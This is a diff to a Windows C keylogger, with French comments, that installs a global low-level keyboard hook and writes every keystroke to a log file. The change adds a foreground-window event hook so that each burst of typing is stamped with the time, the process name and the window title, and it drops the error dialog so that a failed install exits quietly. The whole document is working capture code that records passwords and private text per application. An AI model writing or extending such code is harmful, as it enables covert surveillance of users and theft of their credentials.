@@ -11,15 +11,18 @@
 #pragma comment(lib, "Shlwapi.lib")
 
 // Variables globales
-HHOOK   g_hook;
-FILE*   g_logfile;
-HWND    g_last_window = NULL;  // Dernière fenêtre enregistrée
-char    g_last_process[MAX_PATH] = "";  // Dernier processus enregistré
+HHOOK           g_keyboard_hook;
+HWINEVENTHOOK   g_window_hook;
+FILE*           g_logfile;
+HWND            g_last_window = NULL;           // Dernière fenêtre enregistrée
+HWND            g_foreground_window = NULL;     // Fenêtre en premier plan
+char            g_process_name[MAX_PATH] = "";  // Processus en premier plan
+char            g_window_title[256];            // Titre de la fenêtre en premier plan
 
 // Prototypes de fonctions
 static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+static void CALLBACK handle_fg_window_change(HWINEVENTHOOK, DWORD, HWND, LONG, LONG, DWORD, DWORD);
 static void write_to_log(const char* str);
-static void log_new_window(const char* process_name);
 static const char* get_special_key_name(DWORD vkCode);
 static const char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn);
 
@@ -46,19 +49,28 @@ int main(int argc, char *argv[])
     }
 
     // Installer le hook
-    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
-    if (g_hook == NULL) {
-        MessageBox(NULL, "Erreur lors de l'installation du hook.", "Erreur", MB_ICONERROR);
+    g_window_hook = SetWinEventHook(
+        EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,   // Range of events (0x3 to 0x3).
+        NULL,                                               // Handle to DLL.
+        handle_fg_window_change,                            // The callback.
+        0, 0,                                               // Process and thread IDs of interest (0 = all)
+        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);   // Flags.
+    g_keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+    if (g_keyboard_hook == NULL || g_window_hook == NULL) {
         fclose(g_logfile);
         return 1;
     }
+
+	// Initialiser la fenêtre et le processus en premier plan
+	handle_fg_window_change(NULL, 0, GetForegroundWindow(), 0, 0, 0, 0);
 
     // Boucle de message
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {}
 
     // Nettoyage
-    UnhookWindowsHookEx(g_hook);
+    UnhookWinEvent(g_window_hook);
+    UnhookWindowsHookEx(g_keyboard_hook);
     fclose(g_logfile);
     return 0;
 }
@@ -104,7 +116,7 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
         }
 
 		if (strcmp(key, "") == 0) {
-			return CallNextHookEx(g_hook, nCode, wParam, lParam);
+			return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
 		}
 
         // Gérer les combinaisons de touches (e.g., Ctrl+C)
@@ -123,51 +135,60 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
         // Écrire la touche dans le fichier log
         write_to_log(key);
     }
-    return CallNextHookEx(g_hook, nCode, wParam, lParam);
-}
-
-// Fonction pour enregistrer le changement de fenêtre
-static void log_new_window(const char* process_name)
-{
-    time_t t = time(NULL);
-    struct tm tm = *localtime(&t);
-
-    fprintf(g_logfile, "\n[%04d-%02d-%02d %02d:%02d:%02d] (%s)\n",
-        tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
-        tm.tm_hour, tm.tm_min, tm.tm_sec,
-        process_name);
-    fflush(g_logfile);
+    return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
 }
 
 // Fonction pour écrire dans le fichier log
 static void write_to_log(const char* str)
 {
-    // Obtenir la fenêtre et le processus en premier plan
-    HWND foreground_window = GetForegroundWindow();
-    DWORD pid;
-    GetWindowThreadProcessId(foreground_window, &pid);
+    if (g_foreground_window != g_last_window) {
+		// La fenêtre a changé, écrire le nom du processus et le titre de la fenêtre
+        g_last_window = g_foreground_window;
+        time_t t = time(NULL);
+        struct tm tm = *localtime(&t);
 
-    if (foreground_window != g_last_window) {
-        // La fenêtre a changé, mettre à jour le processus et la fenêtre enregistrés
-        g_last_window = foreground_window;
-
-        HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
-        if (process) {
-            char process_name[MAX_PATH] = "<Unknown>";
-            GetModuleFileNameEx(process, NULL, process_name, MAX_PATH);
-            strcpy(process_name, PathFindFileName(process_name));
-            CloseHandle(process);
-
-            // Log the new process and window
-            if (strcmp(g_last_process, process_name) != 0) {
-                strcpy(g_last_process, process_name);
-            }
-			fflush(g_logfile);
-            log_new_window(process_name);
-        }
+        fprintf(g_logfile, "\n[%04d-%02d-%02d %02d:%02d:%02d] (%s) %s\n",
+            tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
+            tm.tm_hour, tm.tm_min, tm.tm_sec,
+            g_process_name, g_window_title);
     }
     fprintf(g_logfile, "%s", str);
     fflush(g_logfile);
+}
+
+static void CALLBACK handle_fg_window_change(
+    HWINEVENTHOOK hWinEventHook,
+    DWORD event,
+    HWND hwnd,
+    LONG idObject,
+    LONG idChild,
+    DWORD idEventThread,
+    DWORD dwmsEventTime
+)
+{
+    (void)hWinEventHook, event, idObject, idChild, idEventThread, dwmsEventTime;
+
+    // Obtenir le style de la fenêtre
+    LONG_PTR exStyle = GetWindowLongPtr(hwnd, GWL_EXSTYLE);
+
+    // Vérifier si la fenêtre est une fenêtre utilitaire ou système
+	// J'ajoute cela afin d'eviter de log "Task Switching" lors de l'utilisation de ALT+TAB
+    if (exStyle & WS_EX_TOOLWINDOW) {
+        // C'est une fenêtre de type outil, probablement pas une fenêtre d'application principale
+        return;
+    }
+
+    // Obtenir la fenêtre et le processus en premier plan
+    g_foreground_window = hwnd;
+    DWORD pid;
+    GetWindowThreadProcessId(g_foreground_window, &pid);
+
+    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    GetModuleFileNameEx(process, NULL, g_process_name, MAX_PATH);
+    strcpy(g_process_name, PathFindFileName(g_process_name));
+    CloseHandle(process);
+
+    GetWindowText(hwnd, g_window_title, sizeof(g_window_title));
 }
 
 static const char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn)
